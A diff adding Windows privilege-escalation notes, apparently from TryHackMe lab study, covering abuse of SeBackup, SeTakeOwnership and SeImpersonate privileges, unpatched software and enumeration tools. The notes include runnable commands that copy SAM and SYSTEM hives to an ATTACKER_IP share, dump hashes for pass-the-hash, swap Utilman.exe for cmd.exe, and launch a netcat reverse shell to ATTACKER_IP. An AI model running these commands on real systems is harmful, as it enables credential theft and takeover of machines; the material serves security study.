@@ -3956,3 +3956,108 @@ icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
 sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
 ```
 Restart the service, and a reverse shell with SYSTEM privileges will be generated.
+
+### Abusing Dangerous Privileges
+Each user has a set of assigned privileges. This can be checked by using **whoami /priv**
+
+Some of the most common abused privileges include:
++ SeBackup/SeRestore - allows users to read and write any file while ignoring DACL
+
+```
+# E.g. Copying SAM and SYSTEM registry hives to extract Admin's password hash
+# Check privileges 
+whoami /priv
+
+# Backup SYSTEM hashes
+reg save hklm\system C:\Users\THMBackup\system.hive
+
+# Backup SAM hashes
+reg save hklm\sam C:\Users\THMBackup\sam.hive
+
+# Prepare attacking machine using SMB (i.e. attacking machine)
+mkdir share
+python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
+
+# Copy hashes to attacking machine
+copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
+copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
+
+# Use impacket to retrieve users' password hashes (i.e. attacking machine)
+python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
+
+# Use Admin's hash to perform Pass-the-Hash attack
+python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@MACHINE_IP
+```
+
++ SeTakeOwnership - allows a user to take ownership of any object (e.g. files, registry keys)
+
+```
+# E.g. Search service running system and take ownership of executable
+# Check privileges
+whoami /priv
+
+# Abuse Utilman
+# Take ownership of Utilman
+takeown /f C:\Windows\System32\Utilman.exe
+
+# Give user full permissions 
+icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
+
+# Replace utilman.exe with cmd.exe
+copy cmd.exe utilman.exe
+
+# Trigger Lock account and open Ease of Access to trigger Utilman
+```
+
++ SeImpersonate/SeAssignPrimaryToken - allow a process to impersonate other users and act on their behalf
+
+The attacker needs the following:
+1. Spawn a process that a user can connect and authenticate
+2. Find a way to force privileged users to connect and authenticate to the spawned malicious process
+
+```
+# E.g. RogueWinRM exploit
+# Assuming the target is running on IIS and a web shell is planted
+# Check privileges
+whoami /priv
+
+# Trigger RogueWinRM exploit
+c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
+```
+
+### Abusing Vulnerable Software
++ Unpatched Software - organisations and users may not update these often
+
+```
+# Dump information on installed software
+wmic product get name,version,vendor
+```
+
+Once product version information is retrieved, exploits can be searched via Exploit-db, [packet storm](https://packetstormsecurity.com/), or Google searches
+
+### Tools of the Trade
++ [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS) - enumerates the target system to uncover privilege escalation paths
+
+```
+C:\> winpeas.exe > outputfile.txt
+```
+
++ [PrivescCheck](https://github.com/itm4n/PrivescCheck) - alternative to WinPEAS without requiring binary file execution
+
+```
+Set-ExecutionPolicy Bypass -Scope process -Force
+. .\PrivescCheck.ps1
+Invoke-PrivescCheck
+```
+
++ [WES-NG](https://github.com/bitsadmin/wesng) - Python script that is less noisy than WinPEAS
+
+```
+# Update database
+wes.py --update
+
+# Use script and move to attacking machine
+wes.py systeminfo.txt
+```
+
++ Metasploit - multi/recon/local_exploit_suggester module will list vulnerabilities that may affect the target system
